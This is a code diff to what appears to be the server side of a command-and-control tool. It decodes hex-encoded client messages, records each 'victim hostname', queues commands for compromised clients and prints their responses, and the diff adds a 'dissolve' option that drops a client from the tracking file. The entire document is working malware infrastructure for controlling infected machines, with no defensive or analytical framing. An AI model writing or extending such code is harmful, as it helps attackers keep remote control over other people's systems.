@@ -13,22 +13,21 @@ def parsecommand(cmddata):
         "fil": optFile,
         "cnk": optChunk,
         "cmd": optCommand,
+        "dis": optDissolve
     }
 
     return options[decodedcmd](cmddata)
 
 # initial connection by client, set up record in manage.json and return ID to client
 def optInit(cmddata):
-    decodedHostname = bytes.fromhex(cmddata[-2]).decode('utf-8')         # decode value 2, victim hostname
+    decodedHostname = bytes.fromhex(cmddata[-3]).decode('utf-8')         # decode value 3, victim hostname
 
-    print("\n!!!!!!!!!!!!!!!!\n!New Connection!\n!!!!!!!!!!!!!!!!\n")
-
-    manage = {}
+    print("\n\n!New Connection!\n")
 
     with settings.lock:
         with open('./manage.json') as f:
             manage = json.load(f)
-        
+
         idTracker = manage["id"]
         found = False
         
@@ -46,7 +45,8 @@ def optInit(cmddata):
         with open('./manage.json', 'w') as f:
             json.dump(manage, f)
     
-    print("ID: " + str(idTracker))
+    print("ID: " + str(idTracker) + "\tHostname: " + decodedHostname)
+    print("\n" + str(manage["currID"]) + " > ", end = '')
 
     return str(idTracker)
 
@@ -57,6 +57,11 @@ def optCommand(cmddata):
     with settings.lock:
         with open('./manage.json') as f:
             manage = json.load(f)
+        
+        if clientID not in manage["clients"]:           # if client is running and for some reason is not stored in manage.json, add it
+            manage["clients"][clientID] = {"hostname": "unknown", "command": "", "response": ""}
+            print("\n\n!New Connection!\n")
+            print("ID: " + clientID + "\tHostname: " + manage["clients"][clientID]["hostname"])
 
         command = manage["clients"][clientID]["command"]
 
@@ -85,17 +90,30 @@ def optChunk(cmddata):
 
     return "ready"
 
-    
-
 def optEnd(cmddata):
     clientID = cmddata[-2]                              # grab value 2, client ID
     with open('./manage.json') as f:
         manage = json.load(f)
 
-    print("\n" + manage["clients"][clientID]["response"])
-    print("\nInput: ", end = '')
+    print("\n\n" + manage["clients"][clientID]["response"])
+    print("\n" + str(manage["currID"]) + " > ", end = '')
 
     return "ok"
+
+def optDissolve(cmddata):
+    clientID = cmddata[-2]                              # grab value 2, client ID
+
+    with settings.lock:
+        with open('./manage.json') as f:
+            manage = json.load(f)
+
+        del manage["clients"][clientID]
+        manage["currID"] = ""
+
+        with open('./manage.json', 'w') as f:
+            json.dump(manage, f)
+        
+    return "done"
 
 def optFile(cmddata):
     return None
